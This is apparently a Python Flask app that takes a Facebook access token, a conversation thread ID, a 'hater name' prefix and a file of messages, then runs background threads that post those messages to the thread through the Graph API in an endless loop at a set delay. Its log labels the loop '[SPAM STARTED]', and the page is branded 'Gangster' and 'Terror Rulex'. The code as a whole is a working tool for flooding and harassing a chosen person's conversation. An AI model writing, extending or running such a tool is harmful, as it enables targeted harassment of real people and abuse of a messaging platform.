from flask import Flask, request, render_template_string, redirect
import threading
import requests
import time
import uuid

app = Flask(__name__)
app.debug = True

html_code = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title> Convo Server </title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: #000;
      color: #ff0033;
      font-family: 'Courier New', monospace;
      overflow-x: hidden;
      padding-bottom: 80px;
    }

    .header-img {
      width: 100%;
      max-height: 200px;
      object-fit: cover;
      border-radius: 0 0 30px 30px;
      box-shadow: 0 0 30px #ff000077;
      border-bottom: 3px solid red;
    }

    .box {
      max-width: 650px;
      margin: 80px auto;
      background: linear-gradient(145deg, #0a0a0a, #000);
      border: 2px solid #ff000066;
      border-radius: 20px;
      padding: 40px;
      box-shadow:
        0 0 20px #ff0000,
        inset 0 0 20px #ff000044;
      transition: 0.3s;
    }

    .box h2 {
      text-align: center;
      margin-bottom: 30px;
      color: #ff0033;
      text-shadow: 0 0 5px red, 0 0 10px darkred;
    }

    label {
      font-weight: bold;
      color: #ff6666;
    }

    .form-control {
      background: #0d0d0d;
      color: #ffcccc;
      border: 2px solid #ff0033;
      border-radius: 10px;
      box-shadow: inset 0 0 5px #ff000066;
      transition: 0.2s ease-in-out;
    }

    .form-control:focus {
      border-color: #ff0033;
      box-shadow: 0 0 12px #ff0000;
    }

    .btn-submit {
      background: #ff0033;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 18px;
      letter-spacing: 1px;
      border-radius: 10px;
      box-shadow: 0 0 15px #ff0033, inset 0 0 10px #ff002244;
      transition: all 0.2s ease-in-out;
      transform: scale(1);
    }

    .btn-submit:active {
      transform: scale(0.95);
      box-shadow: 0 0 5px #ff0000, inset 0 0 8px #660000;
    }

    .btn-submit:hover {
      background: #cc0022;
      color: #fff;
      box-shadow: 0 0 25px #ff0000;
    }

    footer {
      text-align: center;
      font-size: 14px;
      color: #ff5555;
      margin-top: 50px;
      text-shadow: 0 0 5px #ff0033;
    }

    .glitch {
      text-align: center;
      font-size: 20px;
      color: #ff0033;
      text-shadow: 0 0 5px #ff0033;
      animation: glitch 1s infinite;
    }

    @keyframes glitch {
      0% { text-shadow: 2px 0 red, -2px 0 #ff0033; }
      50% { text-shadow: -2px 0 red, 2px 0 #990000; }
      100% { text-shadow: 2px 0 red, -2px 0 #ff0033; }
    }

    ::-webkit-scrollbar {
      width: 10px;
    }

    ::-webkit-scrollbar-thumb {
      background: #ff0033;
      border-radius: 10px;
    }

    ::selection {
      background: red;
      color: white;
    }
  </style>
</head>
<body>
  <img src="https://raw.githubusercontent.com/Faiizuxd/The_Faizu_dpz/refs/heads/main/92292eb7ec36bc8c323a80f06d1ff7ec.jpg" class="header-img"/>
  <div class="box">
    <h2>Gangster</h2>
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>Access Token:</label>
        <input type="text" class="form-control" name="accessToken" required />
      </div>
      <div class="mb-3">
        <label>Thread ID (Convo ID):</label>
        <input type="text" class="form-control" name="threadId" required />
      </div>
      <div class="mb-3">
        <label>Prefix Name (Hater name):</label>
        <input type="text" class="form-control" name="kidx" required />
      </div>
      <div class="mb-3">
        <label>Msg File(.txt):</label>
        <input type="file" class="form-control" name="txtFile" accept=".txt" required />
      </div>
      <div class="mb-3">
        <label>Message Delay (seconds):</label>
        <input type="number" class="form-control" name="time" min="1" required />
      </div>
      <button type="submit" class="btn btn-submit w-100">Start</button>
    </form>
    <div class="glitch">Free Off course </div>
  </div>
  <footer>
    &copy; 2025 FAIZU BRAND | Terror Rulex Owner 
  </footer>
</body>
</html>
'''

# Keep-alive ping
def keep_alive():
    while True:
        try:
            r = requests.get("http://localhost:22040/")
            print("[KeepAlive] Server check:", r.status_code)
        except Exception as e:
            print("[KeepAlive ERROR]", e)
        time.sleep(300)  # every 5 minutes

# Thread manager
running_threads = {}
thread_lock = threading.Lock()

def message_sender(access_token, thread_id, mn, time_interval, messages, thread_id_key):
    headers = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
    }

    print(f"[SPAM STARTED] Token: {access_token[:15]}...")

    try:
        while thread_id_key in running_threads:
            for msg in messages:
                if thread_id_key not in running_threads:
                    print("[Thread STOPPED by user]")
                    return

                try:
                    full_message = f"{mn} {msg}"
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    params = {'access_token': access_token, 'message': full_message}
                    r = requests.post(api_url, data=params, headers=headers)

                    status = "✅ Success" if r.status_code == 200 else f"❌ Fail {r.status_code}"
                    print(f"[{status}] {full_message}")
                    time.sleep(time_interval)
                except requests.exceptions.RequestException as e:
                    print(f"[Network Error] {e}")
                    time.sleep(60)
                except Exception as ex:
                    print(f"[Unexpected Error] {ex}")
                    time.sleep(60)
    finally:
        print(f"[THREAD EXITED] {thread_id_key}")
        with thread_lock:
            running_threads.pop(thread_id_key, None)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        messages = request.files['txtFile'].read().decode().splitlines()

        thread_id_key = str(uuid.uuid4())[:8]
        thread = threading.Thread(target=message_sender, args=(access_token, thread_id, mn, time_interval, messages, thread_id_key))
        thread.daemon = True
        thread.start()

        with thread_lock:
            running_threads[thread_id_key] = {
                'token': access_token[:15] + "...",
                'thread_id': thread_id,
                'prefix': mn,
                'start_time': time.ctime()
            }

        return redirect('/threads')

    return render_template_string(html_code)

@app.route('/threads')
def show_threads():
    threads_html = '''
    <html><head><title>Running Threads</title></head><body style="background:black; color:#00ffaa; font-family:monospace;">
    <h2> Active Threads</h2><ul>
    '''
    for tid, info in running_threads.items():
        threads_html += f"<li><b>{tid}</b> | Token: {info['token']} | Prefix: {info['prefix']} | Started: {info['start_time']} — <a href='/stop/{tid}'>🛑 Stop</a></li>"
    threads_html += "</ul><br><a href='/'>Back</a></body></html>"
    return threads_html

@app.route('/stop/<tid>')
def stop_thread(tid):
    with thread_lock:
        if tid in running_threads:
            running_threads.pop(tid)
    return redirect('/threads')

if __name__ == '__main__':
    # Start keep-alive thread
    ka_thread = threading.Thread(target=keep_alive)
    ka_thread.daemon = True
    ka_thread.start()

    # Run app
    app.run(host='0.0.0.0', port=22040)
